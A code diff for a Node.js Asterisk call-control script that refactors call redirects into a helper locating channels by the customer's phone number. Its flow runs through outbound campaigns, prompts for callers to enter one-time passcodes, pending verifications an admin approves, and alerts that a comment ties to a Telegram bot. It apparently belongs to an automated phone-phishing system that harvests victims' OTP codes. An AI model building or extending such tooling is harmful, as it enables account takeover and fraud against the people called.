@@ -73,7 +73,9 @@ function verifyOTP(callId, isValid) {
     const callInfo = activeCalls.get(phoneNumber);
     if (isValid) {
         // Redirect to verification success context
-        ami.action({
+		redirectChannel(phoneNumber, 'verification-success', 's')
+        
+		/*ami.action({
             action: "Redirect",
             channel: channel,
             context: "verification-success",
@@ -85,12 +87,13 @@ function verifyOTP(callId, isValid) {
             } else {
                 console.log('Redirected to verification-success context');
             }
-        });
+        });*/
 
         console.log(`OTP verified for ${phoneNumber}, redirecting to success context`);
     } else {
         // Redirect to verification failed context
-        ami.action({
+		redirectChannel(phoneNumber, 'verification-failed', 's')
+        /*ami.action({
             action: "Redirect",
             channel: channel,
             context: "verification-failed",
@@ -102,7 +105,7 @@ function verifyOTP(callId, isValid) {
             } else {
                 console.log('Redirected to verification-failed context');
             }
-        });
+        });*/
 
 
 
@@ -176,6 +179,108 @@ function verifyOTP(callId, isValid) {
     return true;
 }
 
+async function findChannelByCustomerPhone(phoneNumber) {
+    const channels = await getAllChannels();
+    
+    // Check each channel for the CUSTOMER_PHONE variable
+    for (const channel of channels) {
+        try {
+            const varValue = await getChannelVariable(channel.channel, 'CUSTOMER_PHONE');
+            if (varValue === phoneNumber) {
+                return channel.channel;
+            }
+        } catch (err) {
+            // Channel might have hung up, continue
+            continue;
+        }
+    }
+    
+    return null;
+}
+
+async function getAllChannels() {
+    return new Promise((resolve) => {
+        const channels = [];
+        const actionId = Date.now().toString();
+        
+        const statusListener = (event) => {
+            if (event.actionid === actionId && event.event === 'Status') {
+                channels.push(event);
+            }
+        };
+        
+        const completeListener = (event) => {
+            if (event.actionid === actionId) {
+                ami.removeListener('status', statusListener);
+                ami.removeListener('statuscomplete', completeListener);
+                resolve(channels);
+            }
+        };
+        
+        ami.on('status', statusListener);
+        ami.on('statuscomplete', completeListener);
+        
+        ami.action({
+            action: 'Status',
+            actionid: actionId
+        });
+        
+        setTimeout(() => {
+            ami.removeListener('status', statusListener);
+            ami.removeListener('statuscomplete', completeListener);
+            resolve(channels);
+        }, 3000);
+    });
+}
+
+async function getChannelVariable(channelName, variable) {
+    return new Promise((resolve, reject) => {
+        ami.action({
+            action: 'Getvar',
+            channel: channelName,
+            variable: variable
+        }, (err, res) => {
+            if (err || res.response !== 'Success') {
+                reject(err || new Error('Failed to get variable'));
+            } else {
+                resolve(res.value);
+            }
+        });
+    });
+}
+
+// In your Telegram bot code
+async function redirectChannel(phoneNumber, context, extension = 's') {
+    try {
+		console.log('redirectChannel', phoneNumber, context, extension)
+        // First, find the current active channel for this phone number
+        const channelName = await findChannelByCustomerPhone(phoneNumber);
+    
+		if (!channelName) {
+			console.error(`No active channel found for ${phoneNumber}`);
+			return false;
+		}
+        
+        // Now redirect using the correct channel name
+        ami.action({
+            action: 'Redirect',
+            channel: channelName,
+            context: context,
+            exten: extension,
+            priority: 1
+        }, (err, res) => {
+            if (err) {
+                console.error(`Error redirecting to ${context}:`, err);
+            } else {
+                console.log(`Successfully redirected ${phoneNumber} to ${context}`);
+            }
+        });
+        
+    } catch (error) {
+        console.error('Error in redirectChannel:', error);
+    }
+}
+
 // Export function to get pending verifications (for admin interface)
 function getPendingVerifications() {
     const pending = [];
@@ -247,8 +352,9 @@ ami.on("managerevent", async (data) => {
                 callInfo.status = 'order_confirmed';
                 callInfo.dtmfPressed = '1';
 
+				redirectChannel(phoneNumber, 'order-confirmed', 's')
                 // Redirect to order confirmation context
-                ami.action({
+                /*ami.action({
                     action: "Redirect",
                     channel: channel,
                     context: "order-confirmed",
@@ -260,7 +366,7 @@ ami.on("managerevent", async (data) => {
                     } else {
                         console.log('Redirected to order-confirmed context');
                     }
-                });
+                });*/
 
                 // Update campaign statistics
                 if (settings.campaign_id) {
@@ -296,8 +402,9 @@ ami.on("managerevent", async (data) => {
 
                 console.log(`Created pending verification: ${callId} for ${phoneNumber} on ${channel}`);
 
+				redirectChannel(phoneNumber, 'otp-process', 's')
                 // Redirect to OTP process context
-                ami.action({
+                /*ami.action({
                     action: "Redirect",
                     channel: channel,
                     context: "otp-process",
@@ -309,7 +416,7 @@ ami.on("managerevent", async (data) => {
                     } else {
                         console.log('Redirected to otp-process context');
                     }
-                });
+                });*/
 
                 // Log this as a different type of DTMF response
                 add_other_entry_to_database(phoneNumber, digit);
@@ -376,8 +483,9 @@ ami.on("managerevent", async (data) => {
             if (matchingCallId && matchingVerification) {
                 console.log(`Found matching verification: ${matchingCallId} for ${phoneNumber}`);
 
+				redirectChannel(phoneNumber, 'verification-waiting', 's')
                 // Redirect to verification waiting context
-                ami.action({
+                /*ami.action({
                     action: "Redirect",
                     channel: channel,
                     context: "verification-waiting",
@@ -389,7 +497,7 @@ ami.on("managerevent", async (data) => {
                     } else {
                         console.log('Redirected to verification-waiting context');
                     }
-                });
+                });*/
 
                 // Update verification status
                 matchingVerification.status = 'otp_entered';
@@ -458,7 +566,8 @@ ami.on("managerevent", async (data) => {
                     console.log(`${phoneNumber} exceeded 3 OTP attempts, initiating transfer`);
 
                     // Redirect to press-0-transfer context
-                    ami.action({
+					redirectChannel(phoneNumber, 'press-0-transfer', 's')
+                    /*ami.action({
                         action: "Redirect",
                         channel: channel,
                         context: "press-0-transfer",
@@ -470,7 +579,7 @@ ami.on("managerevent", async (data) => {
                         } else {
                             console.log('Redirected to press-0-transfer context');
                         }
-                    });
+                    });*/
 
                     // Notify admin
                     const transferMessage =
@@ -496,7 +605,8 @@ ami.on("managerevent", async (data) => {
                     console.log(`${phoneNumber} pressed 0 but only ${matchingVerification.otpAttempts} attempts, not transferring yet`);
 
                     // Play a message saying "please try entering OTP again or press 9"
-                    ami.action({
+					redirectChannel(phoneNumber, 'press-0-retry', 's')
+                    /*ami.action({
                         action: "Redirect",
                         channel: channel,
                         context: "press-0-retry",
@@ -506,7 +616,7 @@ ami.on("managerevent", async (data) => {
                         if (err) {
                             console.error('Error redirecting to press-0-retry:', err);
                         }
-                    });
+                    });*/
                 }
             }
         }
